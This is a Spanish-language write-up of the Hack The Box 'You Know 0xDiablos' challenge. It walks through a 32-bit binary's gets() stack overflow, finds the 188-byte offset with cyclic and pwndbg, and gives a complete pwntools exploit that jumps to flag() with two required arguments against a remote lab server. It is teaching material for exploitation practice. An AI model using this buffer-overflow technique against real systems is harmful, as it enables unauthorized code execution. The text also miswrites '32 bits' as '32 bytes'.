# You Now 0xDiablos - HTB
> I missed my flag

## Informacion
```bash
~/Documents/htb_challenges ❯ checksec --file vuln
Arch: i386-32-little
RELRO: Partial RELRO
Stack: No canary found
NX: NX unknown - GNU_STACK missing
PIE: No PIE (0x8048000)
Stack: Executable
RWX: Has RWX segments
Stripped: No

~/Documents/htb_challenges ❯ file vuln
vuln: ELF 32-bit LSB executable, Intel i386, version 1 (SYSV)
dynamically linked
interpreter /lib/ld-linux.so.2
BuildID[sha1]=ab7f19bb67c16ae453d4959fba4e6841d930a6dd
for GNU/Linux 3.2.0
not stripped
```

## Planteamiento
El archivo es un `ELF` (ejecutable en Linux) de **32** bytes el cual posee 3 funciones principales:

```cs
pwndbg> info functions

All defined functions:
Non-debugging symbols:
0x08049000 _init
0x08049030 printf@plt
0x08049040 gets@plt
...(more)
0x080491e2 flag // 1 funcion
0x08049272 vuln // 2 funcion
0x080492b1 main // 3 funcion
...(more)

pwndbg> exit
```

Funcion main:

```cs
undefined4 main(void) {
	__gid_t __rgid;
	
	setvbuf(_stdout,(char *)0x0,2,0);
	__rgid = getegid();
	setresgid(__rgid,__rgid,__rgid);
	puts("You know who are 0xDiablos: ");
	vuln(); //Llama la 2 funcion
	return 0;
}

void vuln(void) {
	char local_bc [180]; //Buffer de 180
	
	gets(local_bc); //gets() no chequea el limite del buffer
	puts(local_bc);
	return;
}
```

La funcion main espera un `stdin`, el cual es pasado directamente a la funcion `vuln()` en cuanto se ejecute el programa. Dentro de esa funcion vemos una variable en donde se guarda el stdin con un **size** de 180 y un metodo `gets()` que lee el stdin

> La función gets() es insegura porque no limita la cantidad de caracteres que puede leer, lo que puede provocar desbordamientos de búfer si se ingresan más caracteres de los que el búfer puede manejar

Dado que hay otra funcion (`flag()`), podriamos intentar hacer un Buffer Overflow para sobreescribir el stack con a direccion de memoria de esa funcion

Funcion flag:

```cs
void flag(int param_1,int param_2) { //Espera dos parametros
	char local_50 [64];
	
	FILE *local_10;
	local_10 = fopen("flag.txt","r");
	if (local_10 != (FILE *)0x0) {
		fgets(local_50,64,local_10);
		if ((param_1 == -0x21524111) && (param_2 == -0x3f212ff3)) {
			printf(local_50);
		}
		return;
	}
	
	puts("Hurry up and try in on server side.");
		/* WARNING: Subroutine does not return */
	exit(0);
}
```

La funcion `flag()` lee el archivo `flag.txt` y lo imprime, el contenido es almacenado en la variable `local_50`, pero antes de imprimir la flag realiza una comparacion de igualdad donde: `param_1 == -0x21524111` y `param_2 == -0x3f212ff3`

Estamos lidiando con un binario de **32 bytes**, asi que toda direccion estatica o valor hexadecimal que se vea en el desensamblado debe ser convertida a 32 bytes (seran interpretadas en ejecucion como valores de 32 bytes)

> Valores hexadecimales presentes en el desensamblado seran ejecutados e interpretados como valores de 32 bytes en ejecucion

## Solucion
El primero paso sera averiguar el **buffer** correcto, ya que no es solo 180, porque si probamos con solo 180, este no produce el **Segmentation fault**, usaremos `cyclic`, para generar un payload aleatorio y para encontrar el `OFFSET`

```python
def cyclic_test():
	with open('pat', 'w') as f:
		print(f.write(cyclic(500)))
```

Una vez tengamos el archivo con el payload usaremos `gdb` o `pwndbg` para hacer un debug del binario, al ser un `stdin` la forma de pasarle ese payload al binario es con `<`

```cs
pwndbg> run < pat

You know who are 0xDiablos:
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaaj...(more)

Program received signal SIGSEGV, Segmentation fault.
0x62616177 in ?? () //OFFSET encontrado

...(more)
EBP 0x62616176 ('vaab')
ESP 0xffffcc40 ◂— 0x62616178 ('xaab')
EIP 0x62616177 ('waab')
...(more)

Invalid address 0x62616177

(gdb) run < pat

You know who are 0xDiablos:
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaaj...(more)

Program received signal SIGSEGV, Segmentation fault.

0x62616177 in ?? () //OFFSET encontrado
```

Nuevamene, con cyclic, podemos encontrar el numero exacto

```python
def cyclic_find():
	print(cyclic_find(0x62616177))
```

El offset es de **188**

El segundo paso es obtener la direccion en memoria de la funcion `flag()`
* `0x080491e2 flag`
* `ELF_PATH = context.binary = ELF('./vuln')`
* `FLAG_ADDR = ELF_PATH.sym['flag'] //Regresara 0x080491e2`

Por ultimo, debemos convertir los parametros que espera `flag()`
* `PARAM_1 = (2**32 - 0x21524111) & 0xffffffff`
* `PARAM_2 = (2**32 - 0x3f212ff3) & 0xffffffff`

## Codigo completo
```python
from pwn import *

def main():
	ELF_PATH = context.binary = ELF('./vuln')
	context.arch = 'i386'
	context.log_level = 'warn'
	
	conn = remote('94.237.57.211', 32070)
	
	OFFSET = 180 + 8
	
	FLAG_ADDR = ELF_PATH.sym['flag']
	
	PARAM_1 = (2**32 - 0x21524111) & 0xffffffff
	PARAM_2 = (2**32 - 0x3f212ff3) & 0xffffffff
	
	payload = b'A' * OFFSET
	payload += p32(FLAG_ADDR)
	payload += p32(0xffffffff)
	payload += p32(PARAM_1)
	payload += p32(PARAM_2)
	
	conn.sendline(payload)
	
	print(conn.recvall())

def cyclic_test():
	with open('pat', 'w') as f:
		print(f.write(cyclic(500)))

def cyclic_find():
	print(cyclic_find(0x62616177))

if __name__ == "__main__":
	main()

```